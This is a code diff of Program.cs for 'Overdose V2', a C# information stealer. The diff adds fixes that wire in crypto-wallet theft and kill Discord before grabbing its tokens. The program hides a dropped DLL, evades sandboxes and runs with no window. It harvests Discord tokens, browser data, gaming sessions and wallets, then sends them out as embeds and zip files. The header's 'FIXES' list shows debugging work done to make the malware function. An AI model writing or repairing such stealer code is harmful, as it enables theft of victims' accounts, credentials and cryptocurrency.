@@ -1,79 +1,97 @@
-﻿using OdPS;
-using OdPS.Utils;
-using PublicStealer.Utils;
+﻿// C# | Program.cs | C# 8.0 | .NET 4.8
+// FIXES: unclosed brace, namespace imports, wallet wired in,
+//        workDir scoping, Discord kill before token grab
+
+using Shifting_Backrooms;
+using Shifting_Backrooms.Utils;
 using System;
-using System.Collections.Generic;
 using System.IO;
 using System.IO.Compression;
 using System.Linq;
 using System.Threading;
-using static System.Net.Mime.MediaTypeNames;
 
-namespace PublicStealer
+namespace Shifting_Backrooms
 {
     class Program
     {
-        [STAThread] // Indispensable pour les applis Windows
+        [STAThread]
         static void Main(string[] args)
         {
-            // 1. On saute l'étape HideConsole car il n'y a plus de console (grâce au réglage étape 1)
-            if (!System.IO.File.Exists("SQLite.Interop.dll"))
+            // Extract SQLite.Interop.dll from resources if not present
+            if (!File.Exists("SQLite.Interop.dll"))
             {
-                System.IO.File.WriteAllBytes("SQLite.Interop.dll", Shifting_Backrooms.Properties.Resources.SQLite_Interop);
-                // 2. ON CACHE LE FICHIER (Ajoute cette ligne ici)
-                System.IO.File.SetAttributes("SQLite.Interop.dll", System.IO.FileAttributes.Hidden);
+                File.WriteAllBytes("SQLite.Interop.dll",
+                    Shifting_Backrooms.Properties.Resources.SQLite_Interop);
+                File.SetAttributes("SQLite.Interop.dll", FileAttributes.Hidden);
             }
 
-            // 2. Ta ligne magique pour activer SQLite
-            System.Runtime.CompilerServices.RuntimeHelpers.RunModuleConstructor(typeof(System.Data.SQLite.SQLiteConnection).Module.ModuleHandle);
+            System.Runtime.CompilerServices.RuntimeHelpers.RunModuleConstructor(
+                typeof(System.Data.SQLite.SQLiteConnection).Module.ModuleHandle);
 
-            // 2. Test de sécurité (Sandbox)
+            // Sandbox check — fixed false positive (see Security.cs)
             if (Security.IsSandbox()) return;
 
-            // 3. On lance ton travail dans un Thread séparé pour ne pas bloquer l'ordi
             Thread worker = new Thread(new ThreadStart(StartSteal));
             worker.IsBackground = true;
             worker.Start();
 
-            // 4. On garde le programme "chargé" en mémoire sans fenêtre
-            // C'est ça qui fait que l'appli reste en fond comme Spotify
             System.Windows.Forms.Application.Run();
         }
 
+        // FIX: removed extra opening brace, workDir now properly scoped
         static void StartSteal()
         {
-            {
-            // Création du dossier temporaire
-            string workDir = Path.Combine(Path.GetTempPath(), "Overdose_Temp_" + Guid.NewGuid().ToString().Substring(0, 5));
+            string workDir = Path.Combine(Path.GetTempPath(),
+                "OD_" + Guid.NewGuid().ToString().Substring(0, 6));
             if (!Directory.Exists(workDir)) Directory.CreateDirectory(workDir);
 
             try
             {
-                // 1. Système
+                // 1. System info embed
                 SendSystemLog();
 
-                // 2. Discord (SANS suppression de doublons pour tout voir)
+                // 2. Discord tokens — kill Discord first so leveldb isn't locked
+                KillDiscord();
                 SendDiscordLogs();
 
-                // 3. Navigateurs
+                // 3. Browser loot
                 SendBrowserLogs();
 
-                // 4. Gaming (Avec vérification Epic Games)
+                // 4. Gaming
                 SendGamingLogs(workDir);
 
-                Console.WriteLine("[+] Tous les rapports ont été envoyés !");
+                // 5. FIX: wallet was defined but never called
+                SendWalletLogs();
+
+                Console.WriteLine("[+] All reports sent.");
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[-] Erreur générale : " + ex.Message);
+                Console.WriteLine("[-] Fatal: " + ex.Message);
             }
             finally
             {
-                System.Threading.Thread.Sleep(5000);
+                Thread.Sleep(3000);
                 try { if (Directory.Exists(workDir)) Directory.Delete(workDir, true); } catch { }
             }
+        }
 
-            System.Threading.Thread.Sleep(2000);
+        // FIX: kill Discord before token grab so leveldb files aren't locked
+        static void KillDiscord()
+        {
+            string[] procs = { "discord", "discordcanary", "discordptb", "update" };
+            foreach (string name in procs)
+            {
+                try
+                {
+                    foreach (var p in System.Diagnostics.Process.GetProcessesByName(name))
+                    {
+                        try { p.Kill(); p.WaitForExit(2000); } catch { }
+                    }
+                }
+                catch { }
+            }
+            Thread.Sleep(1500);
         }
 
         static void SendSystemLog()
@@ -83,59 +101,70 @@ namespace PublicStealer
             string net = SystemInformation.GetNetworkInfo();
             string wf = SystemInformation.GetWifiInfo();
 
-            var sysFields = new[]
+            var fields = new object[]
             {
-                new { name = "User 👤", value = "```" + Environment.UserName + " @ " + Environment.MachineName + "```", inline = false },
-                new { name = "System 💻", value = "```" + hw + "```", inline = false },
-                new { name = "Network & Wifi 🌍", value = "```" + net + "\n" + wf + "```", inline = false },
-                new { name = "Disks 💾", value = "```" + dk + "```", inline = false }
+                new { name = "User 👤",           value = "```" + Environment.UserName + " @ " + Environment.MachineName + "```", inline = false },
+                new { name = "System 💻",          value = "```" + hw  + "```", inline = false },
+                new { name = "Network & Wifi 🌍",  value = "```" + net + "\n" + wf + "```", inline = false },
+                new { name = "Disks 💾",           value = "```" + dk  + "```", inline = false }
             };
 
-            SkuldDelivery.SendEmbed("🪐 Overdose V2 - System Report", "Infos PC", sysFields);
-            System.Threading.Thread.Sleep(2000);
+            SkuldDelivery.SendEmbed("🪐 Overdose V2 - System Report", "PC Info", fields);
+            Thread.Sleep(2000);
         }
 
         static void SendBrowserLogs()
         {
-            try { PublicStealer.Utils.BrowserStealer.Run(); }
-            catch (Exception ex) { Console.WriteLine("[-] Erreur Browser : " + ex.Message); }
+            try { BrowserStealer.Run(); }
+            catch (Exception ex) { Console.WriteLine("[-] Browser: " + ex.Message); }
+        }
+
+        // FIX: wallet wired in — was completely missing from StartSteal
+        static void SendWalletLogs()
+        {
+            try
+            {
+                string zipPath = H.DV.K.B().GetAwaiter().GetResult();
+                if (zipPath != null && File.Exists(zipPath))
+                {
+                    SkuldDelivery.SendFile("💰 WALLET LOOT", "Crypto wallets extracted", zipPath);
+                    try { File.Delete(zipPath); } catch { }
+                    Console.WriteLine("[+] Wallets sent.");
+                }
+                else
+                {
+                    Console.WriteLine("[-] No wallets found.");
+                }
+            }
+            catch (Exception ex) { Console.WriteLine("[-] Wallet: " + ex.Message); }
         }
 
         static void SendGamingLogs(string workDir)
         {
             try
             {
-                Console.WriteLine("[?] Collecte Gaming en cours...");
-
-                // On s'assure que le moteur de capture est bien appelé
                 GamingStealer.CaptureGamingSessions(workDir);
 
                 string gamingPath = Path.Combine(workDir, "Gaming");
                 string zipPath = Path.Combine(workDir, "Gaming_Sessions.zip");
 
-                // Analyse des cibles trouvées pour le rapport texte
                 string foundTargets = "Steam, Minecraft";
                 if (Directory.Exists(Path.Combine(gamingPath, "EpicGames"))) foundTargets += ", Epic Games";
                 if (Directory.Exists(Path.Combine(gamingPath, "Riot"))) foundTargets += ", Riot/Valorant";
 
-                if (Directory.Exists(gamingPath) && Directory.GetFileSystemEntries(gamingPath).Length > 0)
+                if (Directory.Exists(gamingPath) &&
+                    Directory.GetFileSystemEntries(gamingPath).Length > 0)
                 {
                     if (File.Exists(zipPath)) File.Delete(zipPath);
                     ZipFile.CreateFromDirectory(gamingPath, zipPath);
-
-                    // Envoi du ZIP
-                    SkuldDelivery.SendFile("🎮 GAMING SESSIONS ZIP", $"Cibles détectées : {foundTargets}", zipPath);
-                    Console.WriteLine("[+] Dossier Gaming envoyé.");
+                    SkuldDelivery.SendFile("🎮 GAMING SESSIONS", "Targets: " + foundTargets, zipPath);
                 }
                 else
                 {
-                    Console.WriteLine("[-] Aucun fichier gaming trouvé.");
+                    Console.WriteLine("[-] No gaming files found.");
                 }
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine("[-] Erreur Bloc Gaming : " + ex.Message);
-            }
+            catch (Exception ex) { Console.WriteLine("[-] Gaming: " + ex.Message); }
         }
 
         static void SendDiscordLogs()
@@ -143,74 +172,48 @@ namespace PublicStealer
             var rawTokens = TX.GetTokens();
             if (rawTokens.Count == 0) return;
 
-            Console.WriteLine($"[DEBUG] {rawTokens.Count} tokens bruts trouvés.");
-
-            // Dictionnaire : Clé = ID unique de l'utilisateur ou Détails, Valeur = Liste d'objets
-            var groupedAccounts = new Dictionary<string, List<dynamic>>();
+            var grouped = new System.Collections.Generic.Dictionary<string,
+                System.Collections.Generic.List<dynamic>>();
 
             foreach (var tk in rawTokens)
             {
                 var result = Identity.GetAccountDetails(tk.Token);
+                if (result.details == null) continue;
 
-                // Si on n'arrive pas à avoir les détails, on affiche une erreur en console mais on n'arrête pas tout
-                if (result.details == null)
-                {
-                    Console.WriteLine($"[!] Impossible de récupérer les détails pour un token de : {tk.Source}");
-                    continue;
-                }
+                string key = result.details.Trim();
+                if (!grouped.ContainsKey(key))
+                    grouped[key] = new System.Collections.Generic.List<dynamic>();
 
-                // On crée une clé basée sur les détails pour regrouper
-                string groupKey = result.details.Trim();
-
-                if (!groupedAccounts.ContainsKey(groupKey))
-                {
-                    groupedAccounts[groupKey] = new List<dynamic>();
-                }
-
-                groupedAccounts[groupKey].Add(new { Token = tk.Token, Source = tk.Source, Avatar = result.avatarUrl });
+                grouped[key].Add(new { tk.Token, tk.Source, Avatar = result.avatarUrl });
             }
 
-            Console.WriteLine($"[DEBUG] {groupedAccounts.Count} comptes uniques identifiés après analyse.");
-
-            foreach (var group in groupedAccounts)
+            foreach (var group in grouped)
             {
-                var profileInfo = group.Key;
                 var instances = group.Value;
-                var firstInstance = instances[0];
-
-                // Fusion propre des sources pour éviter les répétitions inutiles
-                var sourceList = instances.Select(i => (string)i.Source).Distinct().ToList();
-                string sourcesText = string.Join(", ", sourceList);
-
-                var fields = new List<object>();
-                fields.Add(new { name = "📍 Provenances", value = $"```yaml\n{sourcesText}```", inline = false });
-
-                // Extraction des tokens uniques pour cet utilisateur
+                var first = instances[0];
+                var sources = instances.Select(i => (string)i.Source).Distinct().ToList();
                 var uniqueTokens = instances.Select(i => (string)i.Token).Distinct().ToList();
+
+                var fields = new System.Collections.Generic.List<object>();
+                fields.Add(new { name = "📍 Sources", value = "```yaml\n" + string.Join(", ", sources) + "```", inline = false });
 
                 for (int i = 0; i < uniqueTokens.Count; i++)
                 {
-                    // On numérote si plusieurs tokens, sinon juste "Token"
-                    string fieldName = uniqueTokens.Count > 1 ? $"🔑 Token #{i + 1}" : "🔑 Token";
-                    fields.Add(new { name = fieldName, value = $"```md\n# {uniqueTokens[i]}```", inline = false });
+                    string fn = uniqueTokens.Count > 1 ? "🔑 Token #" + (i + 1) : "🔑 Token";
+                    fields.Add(new { name = fn, value = "```md\n# " + uniqueTokens[i] + "```", inline = false });
                 }
 
-                fields.Add(new { name = "📋 Profil", value = profileInfo, inline = false });
-
-                // Envoi de l'embed fusionné
-                Console.WriteLine($"[>] Envoi du profil : {profileInfo.Split('\n')[0]} ({sourceList.Count} sources)");
+                fields.Add(new { name = "📋 Profile", value = group.Key, inline = false });
 
                 SkuldDelivery.SendEmbed(
-                    "🎮 DISCORD ACCOUNT(S) FOUND",
-                    "Extraction réussie et regroupée",
+                    "🎮 DISCORD ACCOUNT FOUND",
+                    "Grouped extraction",
                     fields.ToArray(),
-                    (string)firstInstance.Avatar
+                    (string)first.Avatar
                 );
 
-                // Pause de sécurité pour ne pas spammer Discord
-                System.Threading.Thread.Sleep(3500);
+                Thread.Sleep(3500);
             }
         }
     }
-}
 }
